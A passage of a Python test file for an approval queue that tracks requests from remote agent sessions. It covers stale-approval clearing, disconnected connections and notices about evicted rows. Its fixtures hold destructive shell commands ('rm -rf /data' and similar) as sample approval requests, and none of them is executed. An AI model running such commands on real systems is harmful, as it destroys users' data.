    assert [i.source for i in later] == [SOURCE_ROSTER], (
        "the later wait was swallowed by the earlier settle's tombstone"
    )
    assert later[0].opened_at == BASE_TIME + 30, (
        "the shown wait must be the new one, floored at its own first sighting"
    )


def _polled_approval_fleet(status: str = "working") -> Any:
    """A foreign session holding one polled approval, seen while it was blocked."""
    fleet = foreign_waiting_fleet(status=status)
    return apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-1", "command": "rm -rf /data"}]},
            at=BASE_TIME + 6,
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 6,
    )


def test_a_poll_outside_the_trigger_statuses_clears_stale_approval_detail() -> None:
    """Round eleven's queue-that-lies finding. Polled detail is refreshed only at
    a waiting-or-working row and cleared only by a refresh, so a row that left
    those statuses holding detail could never be refreshed and its approvals
    stayed in the queue, answerable, ageing without bound, for the life of the
    run. The gateway's own lifecycle word is the evidence: an approval-blocked
    session reports ``working``, so a session it calls ``idle`` or ``starting``
    is holding no approval."""
    for ended in ("idle", "starting"):
        seeded = _polled_approval_fleet()
        assert [item.request_key for item in fleet_queue(seeded).items] == ["gw-1"], (
            "the approval was not in the queue to begin with, so this proves nothing"
        )

        moved_on = apply_active_list(
            seeded,
            active_list(row("sess-bg", ended)),
            profile=PROFILE,
            at=BASE_TIME + 60,
            poll_epoch=2,
        )

        assert fleet_queue(moved_on).items == (), f"the approval survived a {ended} poll"
        assert not moved_on.approval_detail.get((PROFILE, "sess-bg")), (
            f"the detail survived a {ended} poll and would re-emit"
        )


def test_a_poll_inside_the_trigger_statuses_keeps_the_approval() -> None:
    """The other leg of the same widening: clearing must not fire where the row
    can still be refreshed, or an ordinary poll of a blocked session would drop
    the approval it is blocked on."""
    for still_blocked in ("waiting", "working"):
        kept = apply_active_list(
            _polled_approval_fleet(),
            active_list(row("sess-bg", still_blocked)),
            profile=PROFILE,
            at=BASE_TIME + 60,
            poll_epoch=2,
        )
        keys = [item.request_key for item in fleet_queue(kept).items]
        assert "gw-1" in keys, f"a {still_blocked} poll dropped the approval"


def test_an_approval_on_a_down_connection_is_refused_not_dropped() -> None:
    """The third exit from the trigger statuses, and it needs the opposite
    answer. A disconnected row cannot be refreshed either, but the evidence is
    MISSING rather than negative — the approval may still be outstanding.
    Dropping it would be the silent loss R14 forbids; offering it would send an
    answer into a socket that is gone."""
    dropped = fleet_connection_lost(
        _polled_approval_fleet(), profile=PROFILE, at=BASE_TIME + 60
    )

    items = fleet_queue(dropped).items
    assert [item.request_key for item in items] == ["gw-1"], (
        "the approval was dropped rather than refused"
    )
    assert not items[0].answerable
    assert items[0].blocked_reason == APPROVAL_ON_DOWN_CONNECTION

    # The second approval on the same session is the leg that distinguishes the
    # fold's preservation branch from nothing at all. Without it this one falls
    # through to the head-of-queue rules and is told "an earlier approval in this
    # session is still waiting" — true of its position, false about why it cannot
    # be answered. Both are unanswerable either way; what is at stake is whether
    # the operator is given the real reason.
    two = fleet_connection_lost(
        apply_approval_pending(
            foreign_waiting_fleet(status="working"),
            decode_pending_approvals(
                {"approvals": [
                    {"request_id": "gw-1", "command": "rm -rf /a"},
                    {"request_id": "gw-2", "command": "rm -rf /b"},
                ]},
                at=BASE_TIME + 6,
            ),
            profile=PROFILE,
            session_id="sess-bg",
            at=BASE_TIME + 6,
        ),
        profile=PROFILE,
        at=BASE_TIME + 60,
    )
    reasons = [item.blocked_reason for item in fleet_queue(two).items]
    assert reasons == [APPROVAL_ON_DOWN_CONNECTION, APPROVAL_ON_DOWN_CONNECTION], (
        f"a second approval on a down connection was given the wrong reason: {reasons}"
    )


def test_a_probed_connection_no_longer_disclaims_its_foreign_approvals() -> None:
    """The successor to the pin that guarded U7's standing disclosure line.

    That test asserted a connection whose approval-detail seam probed *present*
    still said "foreign approval detail is not polled" — true while nothing
    issued ``approval.pending`` as a data call, and the honest disclosure of a
    scheduled gap. U8B closed the gap, so the sentence became false and both the
    line and its pin are retired rather than edited to keep passing.

    Retired, not deleted wholesale: the *absent* seam half is still true and is
    asserted below, because there the gap is real — a gateway with no
    ``approval.pending`` handler genuinely cannot be asked. What changed is only
    the present case, which is now silent, and this asserts that silence directly
    so a regression that stops polling shows up as a line reappearing.
    """
    from talaria.domain.compat import (
        SeamObservation,
        SeamStatus,
        apply_probe_round,
        empty_board,
    )
    from talaria.domain.queue import connection_notices
    from talaria.domain.registry import ConnectionChannel

    channel = ConnectionChannel(profile="beta", connected=True, last_poll_at=BASE_TIME)

    def notices(approval_detail_status: SeamStatus | None) -> tuple[str, ...]:
        board = apply_probe_round(
            empty_board("beta"),
            (
                SeamObservation(
                    seam="roster", status="present", source="probe", trigger="attach", detail=""
                ),
                SeamObservation(
                    seam="approval-detail",
                    status=approval_detail_status,
                    source="probe",
                    trigger="attach",
                    detail="",
                ),
            ),
            at=BASE_TIME,
        )
        return connection_notices(profile="beta", board=board, channel=channel)

    probed_present = notices("present")
    assert probed_present == (), (
        f"a connection whose seams all answered still qualifies its silence: "
        f"{probed_present}"
    )

    # The absent seam is unchanged: there the gap is real, and saying so is the
    # whole of R24. Only the present case moved.
    absent = notices("absent")
    assert any("approval-detail absent" in line for line in absent)
    assert not any("not polled" in line for line in absent), (
        "the deleted standing line came back beside the seam's own"
    )


#  ── v0.4 accumulated review: the eviction that said nothing ───────────────


def test_an_evicted_row_is_named_rather_than_dropped_in_silence() -> None:
    """``truncation_note`` had no production caller, so evictions were silent.

    ``ConnectionChannel.evicted_rows`` says of itself that it "feeds the visible
    truncation note — an eviction is never a silent drop", and
    :func:`~talaria.domain.registry.truncation_note` formats exactly that
    sentence. Nothing called it. The registry evicted rows past its
    per-connection cap (``state.py:3548``), counted them, and rendered the count
    nowhere — so a gateway with more sessions than the cap lost the oldest from
    the picker AND the queue, and a session waiting among them simply vanished.

    Measured before the fix on a 281-session listing against the 256 cap: 25 rows
    dropped, ``evicted_rows == 25``, and zero surfaces mentioning them.

    Found by the accumulated-code review's dead-path sweep, at the seam between
    the registry that produces the count and the surface that never read it.
    """
    from talaria.domain.queue import connection_notices
    from talaria.domain.registry import ROW_CAP_PER_CONNECTION, ConnectionChannel

    channel = ConnectionChannel(profile=PROFILE, connected=True, last_poll_at=BASE_TIME)
    quiet = connection_notices(profile=PROFILE, board=None, channel=channel)
    assert not any("not shown" in line for line in quiet), (
        "a connection that evicted nothing is claiming it did"
    )

    evicted = replace(channel, evicted_rows=25)
    notices = connection_notices(profile=PROFILE, board=None, channel=evicted)
    named = [line for line in notices if "25 older sessions not shown" in line]
    assert named, f"25 evicted rows were dropped in silence: {notices}"
    assert "waiting" in named[0], (
        "the line names the count without naming the consequence for the queue, "
        "which is the half an operator needs"
    )
    assert ROW_CAP_PER_CONNECTION == 256, "the cap moved; this test's numbers are stale"


def test_the_eviction_notice_survives_an_unprobed_connection() -> None:
    """Placement, which the first version of this got wrong.

    ``connection_notices`` short-circuits when the connection has no seam board,
    returning the "capabilities not probed" line alone. An eviction has nothing
    to do with probing — the rows are gone whether or not anyone asked what the
    gateway can do — so a truncation line placed after that return is invisible
    on exactly the connection least able to speak for itself. Measured: the line
    was written, the probe still reported zero surfaces mentioning the drop.
    """
    from talaria.domain.queue import connection_notices
    from talaria.domain.registry import ConnectionChannel

    unprobed = ConnectionChannel(
        profile=PROFILE, connected=True, last_poll_at=BASE_TIME, evicted_rows=9
    )
    notices = connection_notices(profile=PROFILE, board=None, channel=unprobed)

    assert any("9 older sessions not shown" in line for line in notices), (
        "the eviction line is placed after the unprobed short circuit"
    )
    assert any("capabilities not probed" in line for line in notices), (
        "the unprobed line was lost when the eviction line was added"
    )
